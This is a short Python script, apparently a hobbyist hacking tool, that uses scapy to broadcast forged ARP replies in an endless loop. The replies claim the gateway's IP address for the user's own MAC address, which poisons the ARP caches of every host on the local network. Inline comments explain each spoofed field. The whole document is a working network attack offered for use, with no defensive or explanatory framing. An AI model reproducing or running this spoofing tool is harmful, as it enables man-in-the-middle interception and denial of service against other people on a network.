import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
from scapy.all import ARP, Ether, sendp
from getmac import get_mac_address as gma
import keyboard,time
mac=gma()
gate=input("Enter your Gateway-IP:")
print(f"Your MAC:{mac}")
print("STARTED FLOODING................................")
print("Press 'q' or ctrl+c to stop")
while True:
 if keyboard.is_pressed("q"):
  break
 arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gate, hwsrc=mac,  pdst="255.255.255.255")
 try:
  sendp(arp_reply, verbose=0)
 except:
  print("Error Occured...")
  break

#op=2 ==> reply
#dst==> destination MAC
#psrc==> whom we want to spoof
#hwsrc==> our mac
#pdst==> broadcast IP
